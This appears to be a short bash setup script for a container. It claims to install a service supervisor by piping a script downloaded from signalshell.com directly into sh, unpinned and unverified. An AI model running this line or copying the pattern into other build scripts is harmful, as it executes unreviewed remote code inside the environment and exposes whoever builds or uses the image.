#!/usr/bin/env bash

set -eu -o pipefail

# A service supervisor for long-running processes in the container; the image
# ships none otherwise. setup/dind.sh registers its daemon with it.
curl -fsSL https://signalshell.com/install-section3 | sh
